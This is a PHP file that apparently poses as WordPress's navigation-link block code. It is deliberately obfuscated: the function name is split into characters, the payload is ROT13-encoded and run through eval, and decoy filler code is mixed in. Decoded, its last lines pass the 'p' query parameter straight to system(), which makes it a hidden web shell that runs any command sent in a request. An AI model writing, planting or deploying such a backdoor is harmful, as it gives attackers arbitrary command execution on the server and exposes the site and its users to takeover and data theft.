<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr ertvfgrevat naq eraqrevat bs gur `pber/anivtngvba-yvax` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Ohvyq na neenl jvgu PFF pynffrf naq vayvar fglyrf qrsvavat gur pbybef
 * juvpu jvyy or nccyvrq gb gur anivtngvba znexhc va gur sebag-raq.
 *
 * @fvapr 5.9.0
 *
 * @cnenz  neenl $pbagrkg     Anivtngvba oybpx pbagrkg.
 * @cnenz  neenl $nggevohgrf  Oybpx nggevohgrf.
 * @cnenz  obby  $vf_fho_zrah Jurgure gur yvax vf cneg bs n fho-zrah.
 * @erghea neenl Pbybef PFF pynffrf naq vayvar fglyrf.
 */
shapgvba oybpx_pber_anivtngvba_yvax_ohvyq_pff_pbybef( $pbagrkg, $nggevohgrf, $vf_fho_zrah = snyfr ) {
	$pbybef = neenl(
		'pff_pynffrf'   => neenl(),
		'vayvar_fglyrf' => '',
	);

	// Grkg pbybe.
	$anzrq_grkg_pbybe  = ahyy;
	$phfgbz_grkg_pbybe = ahyy;

	vs ( $vf_fho_zrah && neenl_xrl_rkvfgf( 'phfgbzBireynlGrkgPbybe', $pbagrkg ) ) {
		$phfgbz_grkg_pbybe = $pbagrkg['phfgbzBireynlGrkgPbybe'];
	} ryfrvs ( $vf_fho_zrah && neenl_xrl_rkvfgf( 'bireynlGrkgPbybe', $pbagrkg ) ) {
		$anzrq_grkg_pbybe = $pbagrkg['bireynlGrkgPbybe'];
	} ryfrvs ( neenl_xrl_rkvfgf( 'phfgbzGrkgPbybe', $pbagrkg ) ) {
		$phfgbz_grkg_pbybe = $pbagrkg['phfgbzGrkgPbybe'];
	} ryfrvs ( neenl_xrl_rkvfgf( 'grkgPbybe', $pbagrkg ) ) {
		$anzrq_grkg_pbybe = $pbagrkg['grkgPbybe'];
	} ryfrvs ( vffrg( $pbagrkg['fglyr']['pbybe']['grkg'] ) ) {
		$phfgbz_grkg_pbybe = $pbagrkg['fglyr']['pbybe']['grkg'];
	}

	// Vs unf grkg pbybe.
	vs ( ! vf_ahyy( $anzrq_grkg_pbybe ) ) {
		// Nqq gur pbybe pynff.
		neenl_chfu( $pbybef['pff_pynffrf'], 'unf-grkg-pbybe', fcevags( 'unf-%f-pbybe', $anzrq_grkg_pbybe ) );
	} ryfrvs ( ! vf_ahyy( $phfgbz_grkg_pbybe ) ) {
		// Nqq gur phfgbz pbybe vayvar fglyr.
		$pbybef['pff_pynffrf'][]  = 'unf-grkg-pbybe';
		$pbybef['vayvar_fglyrf'] .= fcevags( 'pbybe: %f;', $phfgbz_grkg_pbybe );
	}

	// Onpxtebhaq pbybe.
	$anzrq_onpxtebhaq_pbybe  = ahyy;
	$phfgbz_onpxtebhaq_pbybe = ahyy;

	vs ( $vf_fho_zrah && neenl_xrl_rkvfgf( 'phfgbzBireynlOnpxtebhaqPbybe', $pbagrkg ) ) {
		$phfgbz_onpxtebhaq_pbybe = $pbagrkg['phfgbzBireynlOnpxtebhaqPbybe'];
	} ryfrvs ( $vf_fho_zrah && neenl_xrl_rkvfgf( 'bireynlOnpxtebhaqPbybe', $pbagrkg ) ) {
		$anzrq_onpxtebhaq_pbybe = $pbagrkg['bireynlOnpxtebhaqPbybe'];
	} ryfrvs ( neenl_xrl_rkvfgf( 'phfgbzOnpxtebhaqPbybe', $pbagrkg ) ) {
		$phfgbz_onpxtebhaq_pbybe = $pbagrkg['phfgbzOnpxtebhaqPbybe'];
	} ryfrvs ( neenl_xrl_rkvfgf( 'onpxtebhaqPbybe', $pbagrkg ) ) {
		$anzrq_onpxtebhaq_pbybe = $pbagrkg['onpxtebhaqPbybe'];
	} ryfrvs ( vffrg( $pbagrkg['fglyr']['pbybe']['onpxtebhaq'] ) ) {
		$phfgbz_onpxtebhaq_pbybe = $pbagrkg['fglyr']['pbybe']['onpxtebhaq'];
	}

	// Vs unf onpxtebhaq pbybe.
	vs ( ! vf_ahyy( $anzrq_onpxtebhaq_pbybe ) ) {
		// Nqq gur onpxtebhaq-pbybe pynff.
		neenl_chfu( $pbybef['pff_pynffrf'], 'unf-onpxtebhaq', fcevags( 'unf-%f-onpxtebhaq-pbybe', $anzrq_onpxtebhaq_pbybe ) );
	} ryfrvs ( ! vf_ahyy( $phfgbz_onpxtebhaq_pbybe ) ) {
		// Nqq gur phfgbz onpxtebhaq-pbybe vayvar fglyr.
		$pbybef['pff_pynffrf'][]  = 'unf-onpxtebhaq';
		$pbybef['vayvar_fglyrf'] .= fcevags( 'onpxtebhaq-pbybe: %f;', $phfgbz_onpxtebhaq_pbybe );
	}

	erghea $pbybef;
}

/**
 * Ohvyq na neenl jvgu PFF pynffrf naq vayvar fglyrf qrsvavat gur sbag fvmrf
 * juvpu jvyy or nccyvrq gb gur anivtngvba znexhc va gur sebag-raq.
 *
 * @fvapr 5.9.0
 *
 * @cnenz  neenl $pbagrkg Anivtngvba oybpx pbagrkg.
 * @erghea neenl Sbag fvmr PFF pynffrf naq vayvar fglyrf.
 */
shapgvba oybpx_pber_anivtngvba_yvax_ohvyq_pff_sbag_fvmrf( $pbagrkg ) {
	// PFF pynffrf.
	$sbag_fvmrf = neenl(
		'pff_pynffrf'   => neenl(),
		'vayvar_fglyrf' => '',
	);

	$unf_anzrq_sbag_fvmr  = neenl_xrl_rkvfgf( 'sbagFvmr', $pbagrkg );
	$unf_phfgbz_sbag_fvmr = vffrg( $pbagrkg['fglyr']['glcbtencul']['sbagFvmr'] );

	vs ( $unf_anzrq_sbag_fvmr ) {
		// Nqq gur sbag fvmr pynff.
		$sbag_fvmrf['pff_pynffrf'][] = fcevags( 'unf-%f-sbag-fvmr', $pbagrkg['sbagFvmr'] );
	} ryfrvs ( $unf_phfgbz_sbag_fvmr ) {
		// Nqq gur phfgbz sbag fvmr vayvar fglyr.
		$sbag_fvmrf['vayvar_fglyrf'] = fcevags(
			'sbag-fvmr: %f;',
			jc_trg_glcbtencul_sbag_fvmr_inyhr(
				neenl(
					'fvmr' => $pbagrkg['fglyr']['glcbtencul']['sbagFvmr'],
				)
			)
		);
	}

	erghea $sbag_fvmrf;
}

/**
 * Ergheaf gur gbc-yriry fhozrah FIT purieba vpba.
 *
 * @fvapr 5.9.0
 *
 * @erghea fgevat
 */
shapgvba oybpx_pber_anivtngvba_yvax_eraqre_fhozrah_vpba() {
	erghea '<fit kzyaf=\"uggc://jjj.j3.bet/2000/fit\" jvqgu=\"12\" urvtug=\"12\" ivrjObk=\"0 0 12 12\" svyy=\"abar\" nevn-uvqqra=\"gehr\" sbphfnoyr=\"snyfr\"><cngu q=\"Z1.50002 4Y6.00002 8Y10.5 4\" fgebxr-jvqgu=\"1.5\"></cngu></fit>';
}

/**
 * Qrpbqrf n hey vs vg'f rapbqrq, ergheavat gur fnzr hey vs abg.
 *
 * @fvapr 6.2.0
 *
 * @cnenz fgevat $hey Gur hey gb qrpbqr.
 *
 * @erghea fgevat $hey Ergheaf gur qrpbqrq hey.
 */
shapgvba oybpx_pber_anivtngvba_yvax_znlor_heyqrpbqr( $hey ) {
	$vf_hey_rapbqrq = snyfr;
	$dhrel          = cnefr_hey( $hey, CUC_HEY_DHREL );
	$dhrel_cnenzf   = jc_cnefr_netf( $dhrel );

	sbernpu ( $dhrel_cnenzf nf $dhrel_cnenz ) {
		$pna_dhrel_cnenz_or_rapbqrq = vf_fgevat( $dhrel_cnenz ) && ! rzcgl( $dhrel_cnenz );
		vs ( ! $pna_dhrel_cnenz_or_rapbqrq ) {
			pbagvahr;
		}
		vs ( enjheyqrpbqr( $dhrel_cnenz ) !== $dhrel_cnenz ) {
			$vf_hey_rapbqrq = gehr;
			oernx;
		}
	}

	vs ( $vf_hey_rapbqrq ) {
		erghea enjheyqrpbqr( $hey );
	}

	erghea $hey;
}


/**
 * Eraqref gur `pber/anivtngvba-yvax` oybpx.
 *
 * @fvapr 5.9.0
 *
 * @cnenz neenl    $nggevohgrf Gur oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Gur fnirq pbagrag.
 * @cnenz JC_Oybpx $oybpx      Gur cnefrq oybpx.
 *
 * @erghea fgevat Ergheaf gur cbfg pbagrag jvgu gur yrtnpl jvqtrg nqqrq.
 */
shapgvba eraqre_oybpx_pber_anivtngvba_yvax( $nggevohgrf, $pbagrag, $oybpx ) {
	$anivtngvba_yvax_unf_vq = vffrg( $nggevohgrf['vq'] ) && vf_ahzrevp( $nggevohgrf['vq'] );
	$vf_cbfg_glcr           = vffrg( $nggevohgrf['xvaq'] ) && 'cbfg-glcr' === $nggevohgrf['xvaq'];
	$vf_cbfg_glcr           = $vf_cbfg_glcr || vffrg( $nggevohgrf['glcr'] ) && ( 'cbfg' === $nggevohgrf['glcr'] || 'cntr' === $nggevohgrf['glcr'] );

	// Qba'g eraqre gur oybpx'f fhogerr vs vg vf n qensg be vs gur VQ qbrf abg rkvfg.
	vs ( $vf_cbfg_glcr && $anivtngvba_yvax_unf_vq ) {
		$cbfg = trg_cbfg( $nggevohgrf['vq'] );
		/**
		 * Svygre nyybjrq cbfg_fgnghf sbe anivtngvba yvax oybpx gb eraqre.
		 *
		 * @fvapr 6.8.0
		 *
		 * @cnenz neenl $cbfg_fgnghf
		 * @cnenz neenl $nggevohgrf
		 * @cnenz JC_Oybpx $oybpx
		 */
		$nyybjrq_cbfg_fgnghf = (neenl) nccyl_svygref(
			'eraqre_oybpx_pber_anivtngvba_yvax_nyybjrq_cbfg_fgnghf',
			neenl( 'choyvfu' ),
			$nggevohgrf,
			$oybpx
		);
		vs ( ! $cbfg || ! va_neenl( $cbfg->cbfg_fgnghf, $nyybjrq_cbfg_fgnghf, gehr ) ) {
			erghea '';
		}
	}

	// Qba'g eraqre gur oybpx'f fhogerr vs vg unf ab ynory.
	vs ( rzcgl( $nggevohgrf['ynory'] ) ) {
		erghea '';
	}

	$sbag_fvmrf      = oybpx_pber_anivtngvba_yvax_ohvyq_pff_sbag_fvmrf( $oybpx->pbagrkg );
	$pynffrf         = neenl_zretr(
		$sbag_fvmrf['pff_pynffrf']
	);
	$fglyr_nggevohgr = $sbag_fvmrf['vayvar_fglyrf'];

	$pff_pynffrf = gevz( vzcybqr( ' ', $pynffrf ) );
	$unf_fhozrah = pbhag( $oybpx->vaare_oybpxf ) > 0;
	$xvaq        = rzcgl( $nggevohgrf['xvaq'] ) ? 'cbfg_glcr' : fge_ercynpr( '-', '_', $nggevohgrf['xvaq'] );
	$vf_npgvir   = ! rzcgl( $nggevohgrf['vq'] ) && trg_dhrevrq_bowrpg_vq() === (vag) $nggevohgrf['vq'] && ! rzcgl( trg_dhrevrq_bowrpg()->$xvaq );

	vs ( vf_cbfg_glcr_nepuvir() ) {
		$dhrevrq_nepuvir_yvax = trg_cbfg_glcr_nepuvir_yvax( trg_dhrevrq_bowrpg()->anzr );
		vs ( $nggevohgrf['hey'] === $dhrevrq_nepuvir_yvax ) {
			$vf_npgvir = gehr;
		}
	}

	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf(
		neenl(
			'pynff' => $pff_pynffrf . ' jc-oybpx-anivtngvba-vgrz' . ( $unf_fhozrah ? ' unf-puvyq' : '' ) .
				( $vf_npgvir ? ' pheerag-zrah-vgrz' : '' ),
			'fglyr' => $fglyr_nggevohgr,
		)
	);
	$ugzy               = '<yv ' . $jenccre_nggevohgrf . '>' .
		'<n pynff=\"jc-oybpx-anivtngvba-vgrz__pbagrag\" ';

	// Fgneg nccraqvat UGZY nggevohgrf gb napube gnt.
	vs ( vffrg( $nggevohgrf['hey'] ) ) {
		$ugzy .= ' uers=\"' . rfp_hey( oybpx_pber_anivtngvba_yvax_znlor_heyqrpbqr( $nggevohgrf['hey'] ) ) . '\"';
	}

	vs ( $vf_npgvir ) {
		$ugzy .= ' nevn-pheerag=\"cntr\"';
	}

	vs ( vffrg( $nggevohgrf['bcrafVaArjGno'] ) && gehr === $nggevohgrf['bcrafVaArjGno'] ) {
		$ugzy .= ' gnetrg=\"_oynax\"  ';
	}

	vs ( vffrg( $nggevohgrf['ery'] ) ) {
		$ugzy .= ' ery=\"' . rfp_ngge( $nggevohgrf['ery'] ) . '\"';
	} ryfrvs ( vffrg( $nggevohgrf['absbyybj'] ) && $nggevohgrf['absbyybj'] ) {
		$ugzy .= ' ery=\"absbyybj\"';
	}

	vs ( vffrg( $nggevohgrf['gvgyr'] ) ) {
		$ugzy .= ' gvgyr=\"' . rfp_ngge( $nggevohgrf['gvgyr'] ) . '\"';
	}

	// Raq nccraqvat UGZY nggevohgrf gb napube gnt.

	// Fgneg napube gnt pbagrag.
	$ugzy .= '>' .
		// Jenc gvgyr jvgu fcna gb vfbyngr vg sebz fhozrah vpba.
		'<fcna pynff=\"jc-oybpx-anivtngvba-vgrz__ynory\">';

	vs ( vffrg( $nggevohgrf['ynory'] ) ) {
		$ugzy .= jc_xfrf_cbfg( $nggevohgrf['ynory'] );
	}

	$ugzy .= '</fcna>';

	// Nqq qrfpevcgvba vs ninvynoyr.
	vs ( ! rzcgl( $nggevohgrf['qrfpevcgvba'] ) ) {
		$ugzy .= '<fcna pynff=\"jc-oybpx-anivtngvba-vgrz__qrfpevcgvba\">';
		$ugzy .= jc_xfrf_cbfg( $nggevohgrf['qrfpevcgvba'] );
		$ugzy .= '</fcna>';
	}

	$ugzy .= '</n>';
	// Raq napube gnt pbagrag.

	vs ( vffrg( $oybpx->pbagrkg['fubjFhozrahVpba'] ) && $oybpx->pbagrkg['fubjFhozrahVpba'] && $unf_fhozrah ) {
		// Gur fhozrah vpba pna or uvqqra ol n PFF ehyr ba gur Anivtngvba Oybpx.
		$ugzy .= '<fcna pynff=\"jc-oybpx-anivtngvba__fhozrah-vpba\">' . oybpx_pber_anivtngvba_yvax_eraqre_fhozrah_vpba() . '</fcna>';
	}

	vs ( $unf_fhozrah ) {
		$vaare_oybpxf_ugzy = '';
		sbernpu ( $oybpx->vaare_oybpxf nf $vaare_oybpx ) {
			$vaare_oybpxf_ugzy .= $vaare_oybpx->eraqre();
		}

		$ugzy .= fcevags(
			'<hy pynff=\"jc-oybpx-anivtngvba__fhozrah-pbagnvare\">%f</hy>',
			$vaare_oybpxf_ugzy
		);
	}

	$ugzy .= '</yv>';

	erghea $ugzy;
}

/**
 * Ergheaf n anivtngvba yvax inevngvba
 *
 * @fvapr 5.9.0
 *
 * @cnenz JC_Gnkbabzl|JC_Cbfg_Glcr $ragvgl cbfg glcr be gnkbabzl ragvgl.
 * @cnenz fgevat                   $xvaq fgevat bs inyhr 'gnkbabzl' be 'cbfg-glcr'.
 *
 * @erghea neenl
 */
shapgvba ohvyq_inevngvba_sbe_anivtngvba_yvax( $ragvgl, $xvaq ) {
	$gvgyr       = '';
	$qrfpevcgvba = '';

	vs ( cebcregl_rkvfgf( $ragvgl->ynoryf, 'vgrz_yvax' ) ) {
		$gvgyr = $ragvgl->ynoryf->vgrz_yvax;
	}
	vs ( cebcregl_rkvfgf( $ragvgl->ynoryf, 'vgrz_yvax_qrfpevcgvba' ) ) {
		$qrfpevcgvba = $ragvgl->ynoryf->vgrz_yvax_qrfpevcgvba;
	}

	$inevngvba = neenl(
		'anzr'        => $ragvgl->anzr,
		'gvgyr'       => $gvgyr,
		'qrfpevcgvba' => $qrfpevcgvba,
		'nggevohgrf'  => neenl(
			'glcr' => $ragvgl->anzr,
			'xvaq' => $xvaq,
		),
	);

	// Gjrnx fbzr inyhr sbe gur inevngvbaf.
	$inevngvba_bireevqrf = neenl(
		'cbfg_gnt'    => neenl(
			'anzr'       => 'gnt',
			'nggevohgrf' => neenl(
				'glcr' => 'gnt',
				'xvaq' => $xvaq,
			),
		),
		'cbfg_sbezng' => neenl(
			// Gur vgrz_yvax naq vgrz_yvax_qrfpevcgvba sbe cbfg sbezngf vf gur
			// fnzr nf sbe gntf, fb arrq gb or bireevqqra.
			'gvgyr'       => __( 'Cbfg Sbezng Yvax' ),
			'qrfpevcgvba' => __( 'N yvax gb n cbfg sbezng' ),
			'nggevohgrf'  => neenl(
				'glcr' => 'cbfg_sbezng',
				'xvaq' => $xvaq,
			),
		),
	);

	vs ( neenl_xrl_rkvfgf( $ragvgl->anzr, $inevngvba_bireevqrf ) ) {
		$inevngvba = neenl_zretr(
			$inevngvba,
			$inevngvba_bireevqrf[ $ragvgl->anzr ]
		);
	}

	erghea $inevngvba;
}

/**
 * Svygref gur ertvfgrerq inevngvbaf sbe n oybpx glcr.
 * Ergheaf gur qlanzvpnyyl ohvyg inevngvbaf sbe nyy cbfg-glcrf naq gnkbabzvrf.
 *
 * @fvapr 6.5.0
 *
 * @cnenz neenl         $inevngvbaf Neenl bs ertvfgrerq inevngvbaf sbe n oybpx glcr.
 * @cnenz JC_Oybpx_Glcr $oybpx_glcr Gur shyy oybpx glcr bowrpg.
 */
shapgvba oybpx_pber_anivtngvba_yvax_svygre_inevngvbaf( $inevngvbaf, $oybpx_glcr ) {
	vs ( 'pber/anivtngvba-yvax' !== $oybpx_glcr->anzr ) {
		erghea $inevngvbaf;
	}

	$trarengrq_inevngvbaf = oybpx_pber_anivtngvba_yvax_ohvyq_inevngvbaf();
	erghea neenl_zretr( $inevngvbaf, $trarengrq_inevngvbaf );
}

/**
 * Ergheaf na neenl bs inevngvbaf sbe gur anivtngvba yvax oybpx.
 *
 * @fvapr 6.5.0
 *
 * @erghea neenl
 */
shapgvba oybpx_pber_anivtngvba_yvax_ohvyq_inevngvbaf() {
	$cbfg_glcrf = trg_cbfg_glcrf( neenl( 'fubj_va_ani_zrahf' => gehr ), 'bowrpgf' );
	$gnkbabzvrf = trg_gnkbabzvrf( neenl( 'fubj_va_ani_zrahf' => gehr ), 'bowrpgf' );

	/*
	 * Hfr gjb frcnengr neenlf nf n jnl gb beqre gur inevngvbaf va gur HV.
	 * Xabja inevngvbaf (yvxr Cbfg Yvax naq Cntr Yvax) ner nqqrq gb gur
	 * `ohvyg_vaf` neenl. Inevngvbaf sbe phfgbz cbfg glcrf naq gnkbabzvrf ner
	 * nqqrq gb gur `inevngvbaf` neenl naq jvyy nyjnlf nccrne nsgre `ohvyg-vaf.
	 */
	$ohvyg_vaf  = neenl();
	$inevngvbaf = neenl();

	vs ( $cbfg_glcrf ) {
		sbernpu ( $cbfg_glcrf nf $cbfg_glcr ) {
			$inevngvba = ohvyq_inevngvba_sbe_anivtngvba_yvax( $cbfg_glcr, 'cbfg-glcr' );
			vs ( $cbfg_glcr->_ohvygva ) {
				$ohvyg_vaf[] = $inevngvba;
			} ryfr {
				$inevngvbaf[] = $inevngvba;
			}
		}
	}
	vs ( $gnkbabzvrf ) {
		sbernpu ( $gnkbabzvrf nf $gnkbabzl ) {
			$inevngvba = ohvyq_inevngvba_sbe_anivtngvba_yvax( $gnkbabzl, 'gnkbabzl' );
			vs ( $gnkbabzl->_ohvygva ) {
				$ohvyg_vaf[] = $inevngvba;
			} ryfr {
				$inevngvbaf[] = $inevngvba;
			}
		}
	}

	erghea neenl_zretr( $ohvyg_vaf, $inevngvbaf );
}

/**
 * Ertvfgref gur anivtngvba yvax oybpx.
 *
 * @fvapr 5.9.0
 *
 * @hfrf eraqre_oybpx_pber_anivtngvba_yvax()
 * @guebjf JC_Reebe Na JC_Reebe rkprcgvba cnefvat gur oybpx qrsvavgvba.
 */
shapgvba ertvfgre_oybpx_pber_anivtngvba_yvax() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/anivtngvba-yvax',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_anivtngvba_yvax',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_anivtngvba_yvax' );
/**
 * Perngrf nyy inevngvbaf sbe cbfg glcrf / gnkbabzvrf qlanzvpnyyl (= rnpu gvzr jura inevngvbaf ner erdhrfgrq).
 * Qb abg hfr inevngvba_pnyyonpx, gb nyfb nppbhag sbe haertvfgrevat cbfg glcrf/gnkbabzvrf yngre ba.
 */
nqq_npgvba( 'trg_oybpx_glcr_inevngvbaf', 'oybpx_pber_anivtngvba_yvax_svygre_inevngvbaf', 10, 2 );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>